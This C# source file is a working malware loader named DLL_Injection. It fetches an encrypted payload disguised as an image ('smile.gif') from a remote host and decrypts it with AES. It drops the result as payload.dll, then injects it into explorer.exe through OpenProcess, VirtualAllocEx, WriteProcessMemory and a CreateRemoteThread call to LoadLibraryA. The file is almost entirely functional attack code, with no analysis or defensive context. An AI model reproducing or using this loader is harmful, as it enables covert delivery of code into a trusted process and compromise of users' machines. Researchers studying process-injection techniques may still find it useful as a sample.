using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace DLL_Injection
{
    internal class Program
    {
        // Declare and import Win32 APIs using the DllImport Attribute class.
        // This allows to invoke functions in unmanaged dynamic link libraries.
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            // Download payload from internet.
            string url = "http://10.0.2.4/smile.gif"; // Replace with the actual URL
            byte[] fileBytes;
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string base64String = client.GetStringAsync(url).Result;
                    fileBytes = Convert.FromBase64String(base64String);
                }
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException($"Error downloading the file: {ex.Message}.");
            }


            // Define arrays.
            byte[] key = new byte[32];
            byte[] IV = new byte[16];
            byte[] payload = new byte[fileBytes.Length - key.Length - IV.Length];

            // Copy parts.
            Array.Copy(fileBytes, 0, key, 0, key.Length);
            Array.Copy(fileBytes, key.Length, IV, 0, IV.Length);
            Array.Copy(fileBytes, key.Length + IV.Length, payload, 0, payload.Length);

            // Decrypt data.
            byte[] decryptedData = DecryptAes(payload, key, IV);

            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string dllPath = dir + ".\\payload.dll";

            using (FileStream fileStream = new FileStream(dllPath, FileMode.Create))
            {
                fileStream.Write(decryptedData, 0, decryptedData.Length);
            }


            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            IntPtr outSize;
            //Boolean res = WriteProcessMemory(hProcess, addr, decryptedData, decryptedData.Length, out outSize);
            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), dllPath.Length, out outSize);
            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }


        static byte[] DecryptAes(byte[] input, byte[] key, byte[] iv)
        {
            using (AesManaged aesAlg = new AesManaged())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                aesAlg.Padding = PaddingMode.PKCS7;

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, aesAlg.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(input, 0, input.Length);
                    }
                    return ms.ToArray();
                }
            }
        }
    }
}
